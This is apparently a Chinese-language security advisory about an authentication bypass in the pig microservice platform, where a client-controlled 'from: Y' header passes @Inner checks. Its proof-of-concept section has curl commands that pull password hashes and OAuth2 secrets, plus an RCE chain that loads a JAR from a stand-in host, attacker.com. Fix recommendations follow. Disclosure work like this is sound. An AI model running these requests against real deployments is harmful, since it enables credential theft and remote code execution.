# V-P001: pig 微服务 @Inner 内部鉴权仅依赖 Header 的认证绕过

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | pig4cloud / pig 微服务开发平台 |
| 版本 | 当前主分支（截至 2026-04）|
| 类型 | CWE-290: 使用假设的不可变输入进行身份验证绕过 / CWE-306: 关键功能缺少身份验证 |
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（若微服务端口可达）|
| 代码仓库 | https://github.com/pig-mesh/pig |

## 漏洞描述

pig 平台通过 `@Inner` 注解标记"仅内部调用"接口，切面 `PigSecurityInnerAspect` 对这些接口进行"内部调用"校验。然而校验逻辑**仅检查请求头 `from` 是否等于 `Y`**：

```java
String header = request.getHeader(SecurityConstants.FROM);  // "from"
if (inner.value() && !StrUtil.equals(SecurityConstants.FROM_IN, header)) {  // "Y"
    throw new AccessDeniedException("Access is denied");
}
```

`SecurityConstants`：

```java
String FROM_IN = "Y";
String FROM    = "from";
```

由于该 Header 完全由客户端控制，只要攻击者能直接访问下游微服务端口（绕过 Gateway），即可附带 `from: Y` 通过所有 `@Inner` 接口校验，而 `@Inner` 标注的接口通常认为是"可信调用方"，**完全跳过 OAuth2 Token 校验**，直接暴露密码哈希、用户管理、定时任务管理等高危接口。

### 典型 @Inner 接口

- `/user/info/{username}` — 返回完整用户信息（含 password / salt）
- `/client/{clientId}` — 返回 OAuth2 客户端密钥
- `/mail/send` — 任意发送邮件
- `pig-quartz` — 定时任务 JAR 上传 / 执行
- `pig-gen` — 在线代码生成（含 SQL 执行）

### 组合链 → RCE（Quartz JAR）

`pig-visual/pig-quartz/JarTaskInvok.java:47-58`：

```java
URLClassLoader urlClassLoader = new URLClassLoader(urls, parent);
Class<?> clazz = urlClassLoader.loadClass(className);
Object obj = clazz.newInstance();
```

`JarTask` 允许管理员上传 JAR 文件并通过任意 `className` 实例化执行。结合 `@Inner` 绕过，攻击者可以：
1. 通过 `from: Y` 直接访问 `pig-quartz` 的 `@Inner` 接口创建 JarTask
2. 指向恶意 JAR URL
3. 下一次调度触发时加载并 `newInstance()` → RCE

## 漏洞详情

### 威胁模型

pig 微服务架构中：
- **Gateway** 负责外部 OAuth2 Token 校验
- **下游微服务**（pig-upms-biz / pig-quartz / pig-codegen 等）监听独立端口（如 4000 / 5007 / 5002）
- `@Inner` 注解接口假设只会被 Gateway/Feign 调用

如果下游微服务端口**直接绑定 0.0.0.0** 或在内网横移可达，攻击者可以：
1. 绕过 Gateway 直接访问下游服务端口
2. 请求带上 `from: Y`
3. 突破 `@Inner` 校验拿到服务间内部接口

### 为什么容易被绕过

- `from` 是普通 HTTP 头，无签名 / 无加密 / 无 IP 白名单
- Spring Cloud Gateway 默认并未剥离/重写客户端传入的 `from` 头
- 即使剥离，直接访问下游微服务端口即可绕过 Gateway 这一层
- 错误日志级别为 `log.warn`，产线通常不告警

## 概念验证

### PoC 1: 获取任意用户密码哈希

```bash
# 直接访问 pig-upms-biz 微服务端口（例如 4000）
curl -H "from: Y" \
  "http://<upms-host>:4000/user/info/admin"

# 响应:
# {
#   "user": {
#     "username": "admin",
#     "password": "$2a$10$...",   <- BCrypt 哈希
#     "salt": "xxxx"
#   }
# }
```

### PoC 2: 获取 OAuth2 Client Secret

```bash
curl -H "from: Y" \
  "http://<upms-host>:4000/client/admin"
```

### PoC 3: Quartz 链式 RCE

```bash
# 1) 在攻击者可控服务器放置恶意 JAR（含静态块执行 Runtime.exec）
# 2) 通过 @Inner 接口创建定时任务
curl -X POST -H "from: Y" -H "Content-Type: application/json" \
  http://<quartz-host>:5007/sys-job/ \
  -d '{
    "jobName": "x",
    "jobGroup": "DEFAULT",
    "cronExpression": "0/10 * * * * ?",
    "jobClassName": "com.attacker.Exploit",
    "jarPath": "http://attacker.com/evil.jar"
  }'

# 触发立即执行
curl -X POST -H "from: Y" http://<quartz-host>:5007/sys-job/run/<jobId>
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `pig-common/.../PigSecurityInnerAspect.java` | 60-64 | `@Inner` 仅校验 header=Y |
| `pig-common/.../SecurityConstants.java` | 43, 48 | `FROM_IN="Y"` / `FROM="from"` |
| `pig-visual/pig-quartz/.../JarTaskInvok.java` | 47-58 | 任意 JAR URL + className → newInstance() |
| `pig-upms/.../UserController.java` | - | `@Inner` 端点返回敏感字段 |

## 影响

1. **微服务接口完全暴露**：内部 API 被外部 `from: Y` 打穿
2. **凭证泄露**：密码哈希、OAuth2 client secret 可导致离线破解 / Token 重放
3. **未授权 RCE**：结合 Quartz JAR 任务实现远程命令执行
4. **横向移动**：使用服务间凭证进一步攻击其他内部系统
5. **租户隔离失效**：单租户应用被打穿后可冒充其他租户

## 修复建议

1. **使用 mTLS / JWT 进行服务间鉴权**：`@Inner` 不能仅依赖明文 Header
   ```java
   // 校验 Feign 调用方 Token 签名
   boolean valid = validateServiceToken(request.getHeader("X-Service-Token"));
   ```
2. **网关强制剥离 `from` 头**：在 Gateway 全局过滤器中移除所有入站的 `from` Header
3. **下游服务仅监听内网 IP**：绑定 `127.0.0.1` 或专用内网网卡，拒绝外部直连
4. **添加 IP 白名单**：`@Inner` 接口额外校验调用方 IP ∈ 服务注册中心列表
5. **Quartz / Codegen 严格权限控制**：即使在内部调用中也要二次鉴权，不允许通过 `@Inner` 绕过管理员权限
6. **部署网络隔离**：K8s NetworkPolicy / VPC 安全组严格控制微服务间横向通信

## 验证环境

- 源代码：pig 最新分支（静态代码分析）
- 框架：Spring Boot + Spring Cloud Gateway + OAuth2
- 日期：2026-04-14
